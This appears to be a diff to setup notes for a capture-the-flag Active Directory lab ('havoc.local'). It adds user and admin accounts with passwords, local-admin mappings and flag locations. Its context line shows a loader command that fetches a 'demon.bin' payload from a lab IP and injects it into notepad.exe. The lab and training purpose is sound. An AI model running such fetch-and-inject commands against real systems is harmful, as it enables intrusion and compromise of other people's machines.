@@ -543,7 +543,8 @@ C:\>RustKing.exe --url http://192.168.231.128:9090/demon.bin --target notepad.ex
 
 | **First Name** | **Last Name** | **Username** | **Password**         | **Group** | **Involvement** |
 |----------------|---------------|--------------|----------------------|----------------------------------|---|
-| Aaron          | Adams         | a.adams      | `C0nc0Rd1776!`       | Senior Management, Domain Admins | * |
+|                |               | administrator| `P@$$w0rd!`          | Domain Admins | * |
+| Aaron          | Adams         | a.adams      | `C0nc0Rd1776!`       | Senior Management, Domain Admins |   |
 | Jonathan       | Taylor        | j.taylor     | `Lexington1776!`     | IT Admins, Administrators |   |
 | Jillian        | Anthony       | j.anthony    | `H1dD3nV4ll3y!`      | Engineering |   |
 | Tabitha        | Carter        | t.carter     | `AhArGuY5Nm7U3!@`    | Engineering |   |
@@ -554,8 +555,14 @@ C:\>RustKing.exe --url http://192.168.231.128:9090/demon.bin --target notepad.ex
 | Aaron          | Tarolli       | a.tarolli    | `Password123!`       | Sales | * |
 | Zane           | Dickens       | z.dickens    | `M0t0rH3Ad65^$#`     | Sales |   |
 
+|                            | Local Admin  | Domain Users       |
+|----------------------------|--------------|--------------------|
+| WORKSTATION-01.havoc.local | s.chisholm   | m.seitz, a.tarolli |
+| WORKSTATION-02.havoc.local | m.seitz      |                    |
+| DC01.havoc.local           | administrator|                    |
+
 ### Active Directory Flag Details
 - Flag Format: `HAVOC{MD5}`
 - Flag Amount: 3
-- Flag Location: `C:\Users\localadmin-or-Administrator\Desktop\flag.txt`
+- Flag Location: `\\COMPUTER-NAME\C$\Users\localadmin-or-administrator\Desktop\flag.txt`
 
